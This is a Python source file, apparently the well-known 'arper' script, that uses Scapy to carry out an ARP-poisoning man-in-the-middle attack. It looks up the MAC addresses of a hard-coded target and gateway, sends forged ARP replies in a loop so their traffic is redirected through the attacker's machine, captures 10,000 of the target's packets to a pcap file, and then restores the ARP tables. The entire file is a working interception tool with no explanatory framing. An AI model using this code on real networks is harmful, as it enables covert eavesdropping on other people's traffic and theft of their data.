from scapy.all import *
import os
import sys
import threading
import signal


interface = "en0"
target_ip = '192.168.0.8'
gateway_ip = '192.168.0.1'
packet_count = 10000


conf.iface = interface
conf.verb = 0

print "[*] Setting up %s" % interface


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    print responses.show()

    for s, r in responses:
        return r['Ether'].src

    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_tgt = ARP()
    poison_tgt.op = 2
    poison_tgt.psrc = gateway_ip
    poison_tgt.pdst = target_ip
    poison_tgt.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"

    while True:
        try:
            send(poison_tgt)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print "[*] ARP poison attack finished."
    return


gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip, target_mac)

poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac,
             pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", ), count=5)
    send(ARP(op=2, psrc=target_ip, hwsrc=target_mac,
             pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5)

    os.kill(os.getpid(), signal.SIGKILL)


try:
    print "[*] Starting sniffer for %d packets" % packet_count

    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    wrpcap('arper.pcap', packets)

    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)

